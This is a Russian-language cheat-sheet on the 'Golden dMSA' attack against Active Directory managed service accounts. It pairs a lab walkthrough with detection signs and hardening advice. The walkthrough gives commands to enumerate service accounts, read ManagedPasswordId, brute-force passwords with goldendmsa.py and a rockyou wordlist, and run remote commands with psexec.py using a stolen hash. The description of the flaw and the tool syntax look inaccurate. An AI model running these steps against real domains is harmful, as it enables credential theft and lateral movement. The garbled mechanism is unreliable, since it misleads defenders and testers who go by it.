# Golden dMSA Attack

**Источник:** Semperis Research, July 2025  
**Новизна в 2025:** Криптографическая уязвимость в `ManagedPasswordId`; новый инструмент **GoldenDMSA** позволяет атакующему извлечь и брутфорсить пароли dMSA, что открывает путь к персистентному доступу.

---

## 🎯 Цель атаки
Получить и брутфорсить пароли Group Managed Service Accounts (gMSA/dMSA) для получения долговременного доступа в AD и выполнения действий с привилегиями сервисных учёток.

## 📋 Описание
Golden dMSA Attack — это атака на криптографические слабости в механизме генерации и хранения пароля `msDS-ManagedPassword` у dMSA.  
Особенности:
- При определённых условиях возможно восстановление пароля из `ManagedPasswordId`.
- Атакующий может сгенерировать «золотой» dMSA (аналог Golden Ticket для Kerberos), который позволит бесконечно получать доступ к сервисам.

## ⚠ Условия эксплуатации
- Доступ к чтению атрибутов `msDS-ManagedPassword` или `ManagedPasswordId` у целевого dMSA.
- Возможность выполнения LDAP-запросов к DC.
- Отсутствие строгих ACL на объекты dMSA.

## 🔹 Пошагово в лаборатории
> ⚠ Выполнять только в тестовой среде.

1. Найти все gMSA/dMSA в домене:
```powershell
Get-ADServiceAccount -Filter *
```
2. Извлечь атрибут `ManagedPasswordId`:
```powershell
Get-ADServiceAccount -Identity gmsa01 -Properties ManagedPasswordId
```
3. Использовать инструмент GoldenDMSA для восстановления пароля:
```bash
goldendmsa.py --id <ManagedPasswordId> --wordlist rockyou.txt
```
4. С полученным паролем подключиться к сервисам (например, SQL Server, IIS, SMB) от имени dMSA.

## 📊 Признаки в логах и мониторинг
- Event ID **4662** — доступ к объектам каталога (особенно с `ReadProperty` для dMSA).
- Аномальные аутентификации сервисных аккаунтов с нетипичных хостов.
- LDAP-запросы с выборкой `ManagedPasswordId`.

## 🛡 Меры защиты
- Ограничить права на чтение `msDS-ManagedPassword` и `ManagedPasswordId`.
- Перевыпустить пароли dMSA при подозрении на компрометацию.
- Мониторить входы сервисных учёток.
- Использовать принцип наименьших привилегий.

## 🔗 Источники
- Semperis Research, July 2025 — GoldenDMSA

---

## 🔍 Разбор команд

### 1. Получение списка gMSA/dMSA
```powershell
Get-ADServiceAccount -Filter *
```
- Выводит все управляемые сервисные аккаунты в домене.

### 2. Извлечение ManagedPasswordId
```powershell
Get-ADServiceAccount -Identity gmsa01 -Properties ManagedPasswordId
```
- Показывает уникальный идентификатор пароля, используемый для генерации пароля dMSA.

### 3. Восстановление пароля GoldenDMSA
```bash
goldendmsa.py --id <ManagedPasswordId> --wordlist rockyou.txt
```
- **`--id`** — целевой идентификатор пароля.
- **`--wordlist`** — словарь для перебора пароля.

### 4. Подключение к сервису от имени dMSA
```bash
psexec.py DOMAIN/gmsa01$@target --hashes :<NTLM_HASH>
```
- Использует NTLM-хэш dMSA для удалённого выполнения команд.
